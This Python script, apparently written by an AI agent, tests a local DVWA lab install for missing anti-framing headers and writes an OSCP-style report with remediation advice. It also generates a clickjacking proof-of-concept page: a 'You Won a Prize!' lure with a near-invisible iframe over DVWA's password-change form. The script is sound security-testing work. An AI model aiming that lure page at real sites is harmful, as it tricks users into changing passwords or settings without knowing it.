#!/usr/bin/env python3
"""
DVWA Clickjacking (OTG-CLIENT-009) Test Script
Author: AI Security Agent
Description: Automated testing for clickjacking vulnerabilities in DVWA
"""

import requests
import logging
from datetime import datetime
import html

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class DVWAClickjackingTester:
    def __init__(self):
        self.base_url = "http://localhost/dvwa"
        self.session = requests.Session()
        self.endpoints = [
            "/",
            "/login.php",
            "/security.php",
            "/vulnerabilities/csrf/",
            "/vulnerabilities/xss_r/",
            "/vulnerabilities/xss_s/"
        ]
        self.findings = []
        self.vulnerable_endpoints = []

    def check_clickjacking_protection(self, url):
        """Check if a URL has clickjacking protection headers"""
        try:
            response = self.session.get(url)
            headers = response.headers
            
            x_frame_options = headers.get('X-Frame-Options')
            csp = headers.get('Content-Security-Policy')
            
            # Check for frame-ancestors in CSP
            csp_frame_ancestors = False
            if csp and 'frame-ancestors' in csp:
                csp_frame_ancestors = True
            
            # Determine if protected
            is_protected = bool(x_frame_options or csp_frame_ancestors)
            
            finding = {
                'url': url,
                'x_frame_options': x_frame_options,
                'csp': csp,
                'csp_frame_ancestors': csp_frame_ancestors,
                'is_protected': is_protected,
                'headers': dict(headers)
            }
            
            self.findings.append(finding)
            
            if not is_protected:
                self.vulnerable_endpoints.append(url)
                logger.warning(f"Vulnerable to clickjacking: {url}")
            else:
                logger.info(f"Protected against clickjacking: {url}")
                
        except Exception as e:
            logger.error(f"Error checking {url}: {e}")

    def run_scan(self):
        """Scan all DVWA endpoints for clickjacking protection"""
        logger.info("Starting clickjacking protection analysis...")
        
        for endpoint in self.endpoints:
            url = f"{self.base_url}{endpoint}"
            self.check_clickjacking_protection(url)

    def generate_clickjacking_poc(self):
        """Generate a proof-of-concept HTML file for clickjacking"""
        try:
            poc_html = """<!DOCTYPE html>
<html>
<head>
  <title>You Won a Prize!</title>
  <style>
    body { 
      margin: 0; 
      padding: 0; 
      font-family: Arial, sans-serif; 
      background: #f0f0f0;
    }
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0.01;
      z-index: 2;
      border: none;
    }
    .fake-button {
      position: absolute;
      top: 300px;
      left: 50px;
      z-index: 1;
      background: #e74c3c;
      color: white;
      padding: 15px 30px;
      border: 3px solid white;
      border-radius: 8px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      text-align: center;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    }
    .explanation {
      position: absolute;
      top: 50px;
      left: 50px;
      z-index: 1;
      background: #3498db;
      color: white;
      padding: 15px;
      border-radius: 8px;
      max-width: 400px;
    }
  </style>
</head>
<body>
  <div class="explanation">
    <h2>⚠️ Clickjacking Demo</h2>
    <p>This page demonstrates a clickjacking attack against DVWA.</p>
    <p>The "Claim Prize" button below overlays the real "Change" button from DVWA's CSRF page.</p>
    <p>A user clicking the fake button would unknowingly change their password.</p>
  </div>
  
  <div class="fake-button">🎉 Click to Claim Your Prize! 🎉</div>
  <iframe src="http://localhost/dvwa/vulnerabilities/csrf/"></iframe>
  
  <script>
    // Prevent actual navigation for demo purposes
    document.querySelector('.fake-button').addEventListener('click', function(e) {
      e.preventDefault();
      alert('In a real attack, this click would have changed your DVWA password!');
    });
  </script>
</body>
</html>"""

            with open("clickjacking_poc.html", "w", encoding="utf-8") as f:
                f.write(poc_html)
            
            logger.info("Clickjacking PoC generated: clickjacking_poc.html")
            return True
            
        except Exception as e:
            logger.error(f"Error generating PoC: {e}")
            return False

    def generate_html_report(self):
        """Generate OSCP-style HTML report"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Generate findings HTML
        findings_html = ""
        for finding in self.findings:
            url = html.escape(finding['url'])
            xfo = html.escape(str(finding['x_frame_options'])) if finding['x_frame_options'] else 'Not Present'
            csp = html.escape(str(finding['csp'])) if finding['csp'] else 'Not Present'
            
            # Show sample headers (first 3)
            sample_headers = dict(list(finding['headers'].items())[:3])
            header_lines = [f"{k}: {v}" for k, v in sample_headers.items()]
            headers_text = "\n".join(header_lines) + "\n..."
            
            findings_html += f"""
            <h3>{url}</h3>
            <pre>
X-Frame-Options: {xfo}
Content-Security-Policy: {csp}
Sample Response Headers:
{html.escape(headers_text)}
            </pre>
            """

        # Determine overall status
        if self.vulnerable_endpoints:
            overall_status = '<span class="vulnerable">Vulnerable</span>'
            vulnerable_list = '<br>'.join([html.escape(ep) for ep in self.vulnerable_endpoints])
        else:
            overall_status = '<span class="safe">Not Vulnerable</span>'
            vulnerable_list = 'None'

        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>OSCP-Style Security Assessment Report</title>
  <style>
    /* OSCP-inspired styling: monospace, dark theme, clean layout */
    body {{ 
      font-family: 'Courier New', monospace; 
      background: #111; 
      color: #00FF00; 
      padding: 20px; 
      line-height: 1.6;
    }}
    .header {{ text-align: center; margin-bottom: 30px; }}
    h1, h2, h3 {{ color: #00CCFF; border-bottom: 1px solid #00CCFF; padding-bottom: 5px; }}
    .section {{ margin: 20px 0; }}
    pre {{ 
      background: #222; 
      padding: 12px; 
      border-left: 5px solid #00CCFF; 
      overflow-x: auto; 
      font-size: 0.9em;
      color: #FFCC00;
    }}
    .evidence {{ color: #FFCC00; font-weight: bold; }}
    .recommendation {{ color: #AAFF00; }}
    .vulnerable {{ color: #FF5555; font-weight: bold; }}
    .safe {{ color: #55FF55; }}
    footer {{ margin-top: 60px; font-size: 0.8em; text-align: center; color: #666; }}
    code {{ background: #333; padding: 2px 4px; border-radius: 3px; }}
  </style>
</head>
<body>
  <div class="header">
    <h1>Security Assessment Report</h1>
    <p><strong>Test ID:</strong> OTG-CLIENT-009</p>
    <p><strong>Vulnerability:</strong> Clickjacking</p>
    <p><strong>Target:</strong> http://localhost/dvwa/</p>
    <p><strong>Date:</strong> {timestamp}</p>
  </div>

  <div class="section">
    <h2>1. Test Overview</h2>
    <p><strong>Objective:</strong> Detect the ability to embed DVWA pages in an iframe to trick users into performing unintended actions.</p>
    <p><strong>OWASP Reference:</strong> OTG-CLIENT-009</p>
    <p><strong>Description:</strong> Clickjacking occurs when a vulnerable web page can be framed, allowing an attacker to overlay invisible UI elements and hijack user clicks.</p>
  </div>

  <div class="section">
    <h2>2. Test Procedure</h2>
    <p>1. Send HTTP requests to key DVWA endpoints.</p>
    <p>2. Analyze response headers for <code>X-Frame-Options</code> and <code>Content-Security-Policy</code>.</p>
    <p>3. Confirm absence of anti-framing protections.</p>
    <p>4. Generate a proof-of-concept (PoC) HTML file demonstrating the vulnerability.</p>
  </div>

  <div class="section">
    <h2>3. Findings</h2>
    <h3>Clickjacking Vulnerability</h3>
    <p><strong>Status:</strong> {overall_status}</p>
    <p><strong>Affected Pages:</strong><br>{vulnerable_list}</p>
    <p><strong>Total Endpoints Tested:</strong> {len(self.findings)}</p>
    <p><strong>Vulnerable Endpoints:</strong> {len(self.vulnerable_endpoints)}</p>
    {findings_html}
    <p class="evidence"><strong>Evidence:</strong> {'No anti-framing headers detected on vulnerable pages. Proof-of-concept generated: <code>clickjacking_poc.html</code>' if self.vulnerable_endpoints else 'All pages properly protected with anti-framing headers.'}</p>
  </div>

  <div class="section">
    <h2>4. Impact</h2>
    <p>An attacker can embed DVWA pages in a malicious site and trick logged-in users into performing sensitive actions (e.g., changing password, altering security settings) without their knowledge. This can lead to full account compromise.</p>
  </div>

  <div class="section">
    <h2>5. Recommendations</h2>
    <p class="recommendation">- Add <code>X-Frame-Options: DENY</code> or <code>SAMEORIGIN</code> header.</p>
    <p class="recommendation">- Implement <code>Content-Security-Policy: frame-ancestors 'none'</code> or <code>'self'</code>.</p>
    <p class="recommendation">- Test all sensitive pages for framing vulnerability.</p>
    <p class="recommendation">- Educate users about suspicious page behavior.</p>
    <p class="recommendation">- Regularly audit HTTP response headers for security headers.</p>
  </div>

  <footer>
    &copy; 2025 Automated Security Testing Framework. Report generated by AI Agent.
  </footer>
</body>
</html>"""

        # Write report to file
        try:
            with open("OTG-CLIENT-009_Report.html", "w", encoding="utf-8") as f:
                f.write(html_content)
            logger.info("HTML report generated: OTG-CLIENT-009_Report.html")
        except Exception as e:
            logger.error(f"Failed to write HTML report: {e}")

    def run_tests(self):
        """Main method to run all tests"""
        try:
            logger.info("Starting DVWA Clickjacking Test (OTG-CLIENT-009)")
            
            # Run clickjacking protection analysis
            self.run_scan()
            
            # Generate PoC if vulnerable
            poc_generated = False
            if self.vulnerable_endpoints:
                poc_generated = self.generate_clickjacking_poc()
            
            # Generate report
            self.generate_html_report()
            
            # Final summary
            if self.vulnerable_endpoints:
                logger.warning(f"⚠️  DVWA IS VULNERABLE TO CLICKJACKING!")
                logger.warning(f"Affected endpoints: {len(self.vulnerable_endpoints)}")
                if poc_generated:
                    logger.info("✅ Proof-of-concept file created: clickjacking_poc.html")
            else:
                logger.info("✅ No clickjacking vulnerabilities found")
            
            logger.info("Clickjacking analysis completed successfully")
            
        except Exception as e:
            logger.error(f"Error during testing: {e}")

if __name__ == "__main__":
    tester = DVWAClickjackingTester()
    tester.run_tests()